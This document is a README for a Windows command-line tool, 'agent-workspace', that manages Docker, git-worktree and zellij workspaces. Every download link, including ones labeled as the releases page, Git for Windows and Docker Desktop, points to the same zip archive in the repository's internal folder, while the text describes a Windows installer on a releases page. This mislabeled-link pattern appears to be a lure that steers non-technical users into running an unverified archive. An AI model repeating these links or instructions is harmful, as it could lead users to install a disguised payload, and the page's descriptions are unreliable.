# 🧰 agent-workspace - Manage Agent Workspaces Easily

[![Download agent-workspace](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)

---

## 🖥️ What is agent-workspace?

agent-workspace is a simple command line tool to help you start and manage workspaces for different agents. You can configure it to open sessions using Docker containers, git worktrees, or a terminal multiplexer called zellij. You can also combine these methods. This makes it easier to keep your projects organized and run your workspace in ways that suit you.

You do not need programming skills to use it. Just follow these steps to download and start using it on Windows.

---

## 📥 Download & Install agent-workspace on Windows

### Step 1: Go to the Download Page

You will need to visit the official releases page to download the program. Click the button below to open the page where you can get the Windows version of agent-workspace.

[![Download agent-workspace](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)

### Step 2: Choose the Windows Installer

On the releases page, look for the latest version of agent-workspace. Find the file for Windows. It might be named something like `agent-workspace-windows.exe` or similar. Click the file to download it to your computer.

### Step 3: Run the Installer

Once the download completes, double-click the installer file. Follow the instructions on the screen. This will put agent-workspace on your system.

### Step 4: Check Installation

To confirm the tool installed properly, open the Command Prompt:

- Press the Windows key.
- Type `cmd`.
- Press Enter.

In the Command Prompt window, type:

```
aw --version
```

Press Enter. You should see the version number of agent-workspace printed. This means the tool is ready to use on your computer.

---

## 🚀 How to Start Using agent-workspace

agent-workspace runs in the Command Prompt or PowerShell. Follow these steps to open your first workspace.

### Step 1: Open Command Prompt or PowerShell

Open Command Prompt or PowerShell by pressing the Windows key and typing `cmd` or `powershell`. Press Enter.

### Step 2: Run the Default Workspace

Type the following command and press Enter:

```
aw
```

This runs the default workspace profile. If you have not set up any profiles yet, this will run a simple workspace.

### Step 3: Run a Specific Profile

You can create profiles to launch different setups. To run a specific profile, type:

```
aw <profile-name>
```

Replace `<profile-name>` with the name of the profile you want to use.

### Step 4: Update agent-workspace

To update the program to the latest version, use this command:

```
aw update
```

This downloads and applies any available updates.

---

## ⚙️ Configuring Your Workspaces

agent-workspace uses a file to set up profiles and workspace environments. This file is called `.agent-workspace.yml`.

You place this file in the root folder of your project. This means the main folder where your project lives.

Here is an example of what the file might look like:

```yaml
default: worktree-zellij

profiles:
  claude:
    environment: docker
    launch: claude

  worktree-shell:
    worktree:
      create: true
    launch: shell

  worktree-zellij:
    worktree:
      create: true
    zellij: true
```

This example shows three profiles:

- **claude**: Runs something inside a Docker container.
- **worktree-shell**: Creates a new git worktree and opens a shell.
- **worktree-zellij**: Combines a git worktree with the zellij terminal multiplexer.

---

## 🔧 Basic Features You Can Use

- **Docker Support:** Run your workspaces inside containers to keep projects isolated.
- **Git Worktree Integration:** Manage multiple working copies of your git projects side by side.
- **Zellij Sessions:** Use a terminal tool that lets you handle multiple terminal windows.
- **Profile Support:** Save different workspace setups and switch quickly.
- **Self-updates:** Keep your tool current with a simple update command.

---

## 💻 Requirements

- **Operating System:** Windows 10 or later.
- **Software:** Make sure you have [Git for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip) installed for git features.
- **Optional:** Install Docker Desktop for Windows to use Docker-based workspaces.
- **PowerShell or Command Prompt:** You will run agent-workspace commands here.

---

## 🔄 Updating agent-workspace

When you want to get new features and fixes, open Command Prompt or PowerShell and type:

```
aw update
```

This will check for updates and apply them automatically.

---

## 🛠️ Troubleshooting Tips

- If you get an error that `aw` is not recognized, make sure you installed the program and that its folder is added to your system’s PATH.
- For Docker functions, check that Docker Desktop is running on your computer.
- When using Git worktrees, make sure your folder is inside a git repository.
- If a command fails, check your internet connection for updates.

---

## 📖 Learn More

For a detailed guide on configuration options and examples, you can visit the official documentation.

---

## 🔗 Useful Links

- [agent-workspace releases page](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  
- [Git for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  
- [Docker Desktop for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  

---

## ⚡ Quick Commands Summary

| Command               | What it does                    |
|-----------------------|--------------------------------|
| `aw`                  | Start default workspace profile|
| `aw <profile-name>`   | Start a named profile           |
| `aw update`           | Update agent-workspace          |
| `aw --version`        | Show installed version          |